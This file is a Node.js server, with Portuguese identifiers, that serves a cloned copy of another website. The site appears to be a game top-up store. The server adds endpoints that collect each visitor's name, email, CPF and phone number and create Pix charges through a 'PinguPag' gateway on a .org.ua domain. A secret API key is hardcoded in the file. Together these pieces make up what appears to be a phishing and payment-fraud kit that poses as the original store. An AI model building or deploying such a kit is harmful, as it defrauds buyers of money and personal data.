const fs = require('fs');
const path = require('path');
const http = require('http');
const https = require('https');
const crypto = require('crypto');

const [, , pastaArg = 'recargajogo', portaArg] = process.argv;
const porta = process.env.PORT || portaArg || '4700';
const pasta = path.resolve(process.cwd(), pastaArg);

const clone = JSON.parse(fs.readFileSync(path.join(pasta, 'CLONE.json'), 'utf8'));
const TIPOS = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript',
  '.mjs': 'text/javascript',
  '.css': 'text/css',
  '.json': 'application/json',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.webp': 'image/webp',
  '.avif': 'image/avif',
  '.ico': 'image/x-icon',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf',
  '.mp4': 'video/mp4',
  '.webm': 'video/webm',
  '.mp3': 'audio/mpeg'
};

// === PinguPag Config ===
const PINGUPAG_API_KEY = 'pingupag_sk_e0613630214c3ddff5079ba2eedfbfff7125f4c42a3377e5428853fc5e563f4d';
const PINGUPAG_BASE = 'pagamento-processador.org.ua';

const hosts = [clone.host, ...new Set(clone.arquivos.map((a) => a.arquivo.split(/[\\\/]/)[0]))];

function comBusca(p, search) {
  if (!search) return p;
  let base = p.endsWith('/') ? p + 'index.html' : p;
  if (!path.extname(base)) base += '/index.html';
  const ext = path.extname(base);
  const h = crypto.createHash('sha1').update(search).digest('hex').slice(0, 8);
  return `${base.slice(0, base.length - ext.length)}.${h}${ext}`;
}

function achar(pathname, search) {
  const candidatos = [];
  for (const p of [comBusca(pathname, search), pathname]) {
    candidatos.push(p, ...hosts.map((h) => path.join(h, p)));
  }
  for (const c of candidatos) {
    const abs = path.join(pasta, c);
    if (!abs.startsWith(pasta)) continue;
    if (fs.existsSync(abs) && fs.statSync(abs).isFile()) return abs;
    if (fs.existsSync(path.join(abs, 'index.html'))) return path.join(abs, 'index.html');
  }
  return null;
}

// === Helpers HTTP ===
function readBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', chunk => data += chunk);
    req.on('end', () => resolve(data));
    req.on('error', reject);
  });
}

function httpsPost(hostname, path, body, headers) {
  return new Promise((resolve, reject) => {
    const payload = JSON.stringify(body);
    const options = {
      hostname,
      path,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
        ...headers
      }
    };
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try { resolve({ status: res.statusCode, body: JSON.parse(data) }); }
        catch(e) { resolve({ status: res.statusCode, body: data }); }
      });
    });
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

function httpsGet(hostname, reqPath, headers) {
  return new Promise((resolve, reject) => {
    const options = { hostname, path: reqPath, method: 'GET', headers };
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try { resolve({ status: res.statusCode, body: JSON.parse(data) }); }
        catch(e) { resolve({ status: res.statusCode, body: data }); }
      });
    });
    req.on('error', reject);
    req.end();
  });
}

function corsHeaders(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
}

function sendJSON(res, status, data) {
  corsHeaders(res);
  res.writeHead(status, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(data));
}

// === REQUEST HANDLER (funciona no Node.js local e na Vercel) ===
async function requestHandler(req, res) {
  const url = new URL(req.url, 'http://x');

  // Identificar caminho real (compatível com rewrites da Vercel)
  let rawPath = req.headers['x-forwarded-uri'] ||
                req.headers['x-matched-path'] ||
                url.searchParams.get('__path') ||
                url.pathname;

  // Remover query string se estiver no rawPath
  if (rawPath.includes('?')) {
    rawPath = rawPath.split('?')[0];
  }

  const p = decodeURIComponent(rawPath);

  // --- CORS preflight ---
  if (req.method === 'OPTIONS') {
    corsHeaders(res);
    res.writeHead(204);
    return res.end();
  }

  // ======================================================
  // API: POST /api/pix  - Criar cobrança Pix via PinguPag
  // ======================================================
  if (p === '/api/pix' && req.method === 'POST') {
    try {
      let data;
      if (req.body && typeof req.body === 'object') {
        data = req.body;
      } else if (typeof req.body === 'string') {
        data = JSON.parse(req.body);
      } else {
        const raw = await readBody(req);
        data = JSON.parse(raw);
      }

      // Validação mínima
      const { nome, email, cpf, telefone, valor, descricao, referencia } = data;
      if (!nome || !email || !cpf || !telefone || !valor) {
        return sendJSON(res, 400, { error: 'Campos obrigatórios faltando.' });
      }

      // Converter valor (ex: "R$ 15,00" ou "15.00" ou 1500) para centavos
      let amountCents;
      if (typeof valor === 'number') {
        amountCents = valor;
      } else {
        const cleaned = String(valor).replace(/[R$\\s]/g, '').replace('.', '').replace(',', '.');
        amountCents = Math.round(parseFloat(cleaned) * 100);
      }

      // Limpar CPF e telefone (somente números)
      const docClean = String(cpf).replace(/\\D/g, '');
      const telClean = String(telefone).replace(/\\D/g, '');

      // Referência única
      const ref = referencia || `FF-${Date.now()}-${Math.random().toString(36).slice(2, 8).toUpperCase()}`;

      const payload = {
        amount: amountCents,
        description: 'Info Produto 2',
        reference: ref,
        source: 'api_externa',
        customer: {
          name: nome,
          email: email,
          document: docClean,
          phone: telClean
        }
      };

      console.log('[PinguPag] Criando cobrança:', JSON.stringify(payload));

      const result = await httpsPost(
        PINGUPAG_BASE,
        '/gateway/v1/transaction',
        payload,
        { 'X-API-Key': PINGUPAG_API_KEY }
      );

      console.log('[PinguPag] Resposta:', result.status, JSON.stringify(result.body));

      if (result.status === 200 && result.body && result.body.qr_code) {
        return sendJSON(res, 200, {
          ok: true,
          transaction_id: result.body.transaction_id,
          reference: ref,
          qr_code: result.body.qr_code,
          qr_code_base64: result.body.qr_code_base64,
          amount: result.body.amount,
          expires_at: result.body.expires_at
        });
      } else {
        return sendJSON(res, 502, {
          error: 'Falha ao gerar Pix.',
          detalhe: result.body
        });
      }
    } catch (err) {
      console.error('[PinguPag] Erro:', err);
      return sendJSON(res, 500, { error: 'Erro interno: ' + err.message });
    }
  }

  // ======================================================
  // API: GET /api/pix/status?id=TRANSACTION_ID
  // ======================================================
  if (p === '/api/pix/status' && req.method === 'GET') {
    const txId = url.searchParams.get('id');
    if (!txId) return sendJSON(res, 400, { error: 'id obrigatório' });

    try {
      const result = await httpsGet(
        PINGUPAG_BASE,
        `/gateway/v1/query?action=get_transaction&id=${txId}`,
        { 'X-API-Key': PINGUPAG_API_KEY }
      );
      return sendJSON(res, 200, result.body);
    } catch (err) {
      return sendJSON(res, 500, { error: err.message });
    }
  }

  // ======================================================
  // Rota Inicial (/) - Serve a Home diretamente
  // ======================================================
  if (p === '/' || p === '') {
    const homeAbs = achar(clone.inicio, '');
    if (homeAbs) {
      corsHeaders(res);
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return fs.createReadStream(homeAbs).pipe(res);
    }
    res.writeHead(302, { Location: clone.inicio });
    return res.end();
  }

  // ======================================================
  // Servir Arquivos Estáticos
  // ======================================================
  const abs = achar(p, url.search);
  if (!abs) {
    res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
    return res.end('não capturado: ' + p);
  }

  corsHeaders(res);
  res.writeHead(200, { 'Content-Type': TIPOS[path.extname(abs).toLowerCase()] || 'application/octet-stream' });
  fs.createReadStream(abs).pipe(res);
}

module.exports = requestHandler;

// Iniciar servidor se executado diretamente via terminal (ex: node servir.cjs)
if (require.main === module) {
  http.createServer(requestHandler).listen(Number(porta), '0.0.0.0', () => {
    console.log(`clone de ${clone.alvo} em http://localhost:${porta}/`);
  });
}
